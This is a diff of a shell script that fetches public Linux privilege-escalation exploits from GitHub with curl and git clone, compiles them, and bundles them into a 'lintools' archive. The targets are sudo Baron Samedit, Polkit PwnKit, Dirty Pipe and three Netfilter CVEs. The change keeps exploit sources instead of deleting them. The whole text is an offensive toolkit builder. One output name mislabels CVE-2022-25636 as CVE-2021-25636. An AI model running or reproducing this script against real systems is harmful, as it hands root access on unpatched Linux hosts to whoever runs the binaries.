@@ -27,31 +27,31 @@ chmod +x ../CVE-2021-3156-exploit && cd ../ && rm -rf CVE-2021-3156
 # Polkit - CVE-2021-4034
 curl -s https://raw.githubusercontent.com/arthepsy/CVE-2021-4034/main/cve-2021-4034-poc.c > CVE-2021-4034-exploit.c
 gcc CVE-2021-4034-exploit.c -o CVE-2021-4034-exploit
-rm -rf CVE-2021-4034-exploit.c
+#rm -rf CVE-2021-4034-exploit.c
 
 # Dirty Pipe - CVE-2022-0847
 curl -s https://raw.githubusercontent.com/AlexisAhmed/CVE-2022-0847-DirtyPipe-Exploits/main/exploit-1.c > CVE-2022-0847-exploit-1.c
 curl -s https://raw.githubusercontent.com/AlexisAhmed/CVE-2022-0847-DirtyPipe-Exploits/main/exploit-2.c > CVE-2022-0847-exploit-2.c
 gcc CVE-2022-0847-exploit-1.c -o CVE-2022-0847-exploit-1
 gcc CVE-2022-0847-exploit-2.c -o CVE-2022-0847-exploit-2
-rm -rf CVE-2022-0847-exploit-1.c CVE-2022-0847-exploit-2.c
+#rm -rf CVE-2022-0847-exploit-1.c CVE-2022-0847-exploit-2.c
 
 # Netfilter - CVE-2021-22555
 curl -s https://raw.githubusercontent.com/google/security-research/master/pocs/linux/cve-2021-22555/exploit.c > CVE-2021-22555.c
 gcc CVE-2021-22555.c -o CVE-2021-22555-exploit
-rm -rf CVE-2021-22555.c
+#rm -rf CVE-2021-22555.c
 
 # Netfilter - CVE-2022-25636
 git clone https://github.com/Bonfee/CVE-2022-25636.git
 cd CVE-2022-25636 && make
 mv exploit ../CVE-2021-25636-exploit
-chmod +x ../CVE-2021-25636-exploit && cd ../ && rm -rf CVE-2022-25636
+chmod +x ../CVE-2021-25636-exploit && cd ../
 
 # Netfilter - CVE-2023-32233
 git clone https://github.com/Liuk3r/CVE-2023-32233.git
 cd CVE-2023-32233 && gcc -Wall -o exploit exploit.c -lmnl -lnftnl
 mv exploit ../CVE-2023-32233-exploit
-chmod +x ../CVE-2023-32233-exploit && cd ../ && rm -rf CVE-2023-32233
+chmod +x ../CVE-2023-32233-exploit && cd ../
 
 
 # Package tools in lintools.zip
